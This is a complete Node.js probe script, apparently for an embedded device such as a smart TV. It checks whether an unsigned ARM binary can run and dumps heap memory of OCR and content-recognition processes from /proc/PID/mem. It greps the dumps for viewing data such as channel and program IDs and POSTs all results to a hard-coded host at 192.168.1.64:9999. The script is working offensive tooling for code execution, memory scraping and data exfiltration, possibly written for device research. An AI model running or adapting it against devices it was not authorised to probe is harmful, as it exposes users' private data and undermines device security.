"use strict";
var fs = require("fs");
var http = require("http");
var cp = require("child_process");

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: "192.168.1.64", port: 9999, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { res.resume(); console.log("posted " + path + " " + res.statusCode); });
    req.on("error", function (e) { console.log("post err " + path + " " + e.message); });
    req.write(data);
    req.end();
}

function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 20000 }).slice(0, cap || 8000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
var SDK = "/home/owner/share/tmp/sdk_tools";

// 1. exec test: can a pushed unsigned ARM binary run?
sh("rm -f /opt/usr/exectest_ok");
out.exec_direct = sh("chmod +x " + SDK + "/exectest; " + SDK + "/exectest; echo rc=$?");
out.exec_marker = sh("cat /opt/usr/exectest_ok 2>&1");
out.exec_memfd = sh("cp " + SDK + "/exectest /dev/shm/exectest 2>&1; /dev/shm/exectest 2>&1; echo rc=$?; cat /opt/usr/exectest_ok 2>&1");

// 2. heap visibility: where are the readable rw regions of the OCR/acr processes?
out.maps_ocr = sh("grep -E 'rw|heap' /proc/1394/maps | head -12");
out.maps_acr = sh("grep -E 'rw|heap' /proc/1962/maps | head -12");

// 3. sample strings from the OCR service heap (raw text?) and acr heap (JSON payload?)
out.ocr_heap_strings = sh("for seg in $(awk '/heap|\\[anon/ {split($1,a,\"-\"); print strtonum(\"0x\"a[1])\" \"strtonum(\"0x\"a[2])}' /proc/1394/maps | head -8); do set -- $seg; dd if=/proc/1394/mem bs=4096 skip=$(( $1 / 4096 )) count=$(( ( $2 - $1 ) / 4096 )) 2>/dev/null; done | strings -n 4 | head -60", 6000);
out.acr_heap_strings = sh("for seg in $(awk '/heap|\\[anon/ {split($1,a,\"-\"); print strtonum(\"0x\"a[1])\" \"strtonum(\"0x\"a[2])}' /proc/1962/maps | head -8); do set -- $seg; dd if=/proc/1962/mem bs=4096 skip=$(( $1 / 4096 )) count=$(( ( $2 - $1 ) / 4096 )) 2>/dev/null; done | strings -n 6 | grep -E '\\{|channelName|programId|psid|contentId|recog|title|Title' | head -25", 5000);

post("/ocr_probe3", out);
post("/ocr_probe3_done", { started: out.started });
